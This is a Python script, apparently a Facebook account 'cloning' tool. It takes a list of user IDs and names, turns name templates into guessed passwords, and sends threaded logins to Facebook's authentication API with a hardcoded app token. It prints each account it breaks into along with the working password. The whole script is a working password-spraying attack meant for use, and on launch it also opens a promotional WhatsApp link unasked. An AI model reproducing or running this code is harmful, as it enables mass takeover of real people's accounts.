#WRITTEN BY ZAALIM KING
 
#FOLLOW MY GITHUB : https://github.com/MR-DIPTO-404
 
#----------import----------#
 
import os
 
from time import sleep as slp
 
from concurrent.futures import ThreadPoolExecutor as ted
 
import uuid
 
import random 
 
import httpx
 
import json
 
import sys
 
print('\033[1;33m[•] ADD/MY WATSAPP GRUP🙈')
 
os.system('xdg-open https://chat.whatsapp.com/DyFyjZ6sqF26HgxV9xLqW6')
 
#----------logo----------#
 
#----------logo----------#
 
logo=('''     
\033[1;33m                  
     \033[1;33m███████╗ █████╗  █████╗ ██╗     ██╗███╗   ███╗
     \033[1;33m╚══███╔╝██╔══██╗██╔══██╗██║     ██║████╗ ████║
       \033[1;32m███╔╝ ███████║███████║██║     ██║██╔████╔██║
     \033[1;33m ███╔╝  ██╔══██║██╔══██║██║     ██║██║╚██╔╝██║
     \033[1;33m███████╗██║  ██║██║  ██║███████╗██║██║ ╚═╝ ██║
     \033[1;91m╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝     ╚═╝''')
#----------clear----------#
 
def clear():
 
    os.system('clear')
 
    print(logo)
 
    print(42*'-')
 
    print(' \033[1;33m[§] OWNER      : ZAALIM')
 
    print(' \033[1;33m[§] FACEBOOK   : ZAALIM BADSHAH')
    
    print(' \033[1;33m[§] TOOL TYPE  : 🥵🥵🥵')
    print(' \033[1;33m[§] VERSION    : 1.2')
    print(' \033[1;33m[§] INSTA ID:   :  tera._ashiq')
    print(42*'-')
 
#----------line----------#
 
def line():
 
    print(42*'-')
 
#----------menu----------#
 
def main():
 
    clear()
 
    print(' \033[1;32m[1] FILE CLONING ')
 
    print(' \033[1;32m[0] EXIT ')
 
    line()
 
    option=input(' [§] CHOICE MENU : ')
 
    if option in ['1']:
 
        __file__()
 
    else:
 
        exit(' THANKS FOR USING ZAALIM BADSHAH COMMAND  ')
#_________Year checker_________#
def asha(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :alif = ' (*-*) 2009 '
        elif uid[:9] in ['100000000']       :alif = ' ACCOUNT  2009 '
        elif uid[:8] in ['10000000']        :alif = ' ACCOUNT 2009 '
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = ' ACCOUNT 2009 '
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:alif = ' ACCOUNT 2010 '
        elif uid[:6] in ['100001']          :alif = ' ACCOUNT 2010/2011 '
        elif uid[:6] in ['100002','100003'] :alif = ' ACCOUNT 2011/2012 '
        elif uid[:6] in ['100004']          :alif = ' ACCOUNT 2012/2013 √'
        elif uid[:6] in ['100005','100006'] :alif = ' ACCOUNT 2013/2014 '
        elif uid[:6] in ['100007','100008'] :alif = ' ACCOUNT 2014/2015 '
        elif uid[:6] in ['100009']          :alif = ' ACCOUNT 2015 '
        elif uid[:5] in ['10001']           :alif = ' ACCOUNT 2015/2016 '
        elif uid[:5] in ['10002']           :alif = ' ACCOUNT 2016/2017 '
        elif uid[:5] in ['10003']           :alif = ' ACCOUNT 2018/2019 '
        elif uid[:5] in ['10004']           :alif = ' ACCOUNT 2019/2020 '
        elif uid[:5] in ['10005']           :alif = ' ACCOUNT 2020 '
        elif uid[:5] in ['10006','10007','']:alif = ' ACCOUNT 2021 '
        elif uid[:5] in ['10008']           :alif = ' ACCOUNT 2022 '
        elif uid[:5] in ['10009']           :alif = ' ACCOUNT 2023 '
        else:alif=''
    elif len(uid) in [9,10]:
        alif = ' ACCOUNT 2008/2009 '
    elif len(uid)==8:
        alif = ' ACCOUNT 2007/2008 '
    elif len(uid)==7:
        alif = ' ACCOUNT 2006/2007 '
    else:alif=''
    return alif
 
#----------file----------#
 
def __file__():
 
    clear()
    print('     \033[1;32mEXAMPLE : 🙈 sd/card/Zaalim.txt ')
    line()
 
    filex=input(' [§] ENTER FILE PATH : ')
 
    try:
 
        fo=open(filex,'r').read().splitlines()
 
    except FileNotFoundError:
 
        print(' \033[1;91mFile not found !!');slp(2)
 
        __file__()
 
    clear()
 
    try:
 
        pas_limit=int(input(' \033[1;32m[§] ENTER PASSWORD LIMIT : '))
 
    except:
 
        pas_limit=1
 
    line()
 
    pas_list=[]
 
    for i in range(pas_limit):
 
        pasx=input(f' \033[1;32m[§] ENTER PASSWORD {i+1} : ')
 
        pas_list.append(pasx)
 
    with ted(max_workers=30) as Dipto:
 
        tl=str(len(fo))
 
        clear()
 
        print(' \033[1;33mTOTAL ACCOUNT : '+tl)
 
        print(' \033[1;33mON/OF AIRPLANE MODE FOR SPEED UP:)')
 
        line()
 
        for user in fo:
 
            ids,names=user.split('|')
 
            passlist=pas_list
 
            Dipto.submit(m1,ids,names,passlist)
 
    line()
 
    print(' \033[1;33mTHE PROCESS HAS BEEN COMPLETE')
 
    input(' \033[1;33mPRESS ENTER TO BACK : ')
 
    main()
 
loop=0
 
oks=[]
 
cps=[]
 
#----------method------------#
 
def m1(ids,names,passlist):
 
    global oks,loop
 
    try:
 
        fn=names.split(' ')[0]
 
        try:
 
            ln=names.split(' ')[1]
 
        except:
 
            ln=fn
 
        for pw in passlist:
 
            sys.stdout.write('\r\r \033[1;32m[Zaalim•SY] %s|OK:%s '%(loop,len(oks)));sys.stdout.flush()
 
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
 
            head={'User-Agent': '[Mozilla/5.0 (Linux; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/381.0.0.29.105;]'}
 
            url='https://b-graph.facebook.com/auth/login'
 
            req=httpx.post(url,data=data,headers=head).json()
 
            if 'session_key' in req:
 
                print('\r\r \033[1;32m[WIEBO-OK] '+ids+'|'+pas)
 
                oks.append(ids)
 
                break
 
            elif 'www.facebook.com' in req['error']['message']:
 
                print('\r\r \033[1;91m[SY-CP] '+ids+'|'+pas)
 
                cps.append(ids)
 
                break
 
            else:
 
                continue
 
        loop+=1
 
    except:
 
        pass
 
#----------end----------#
 
main()
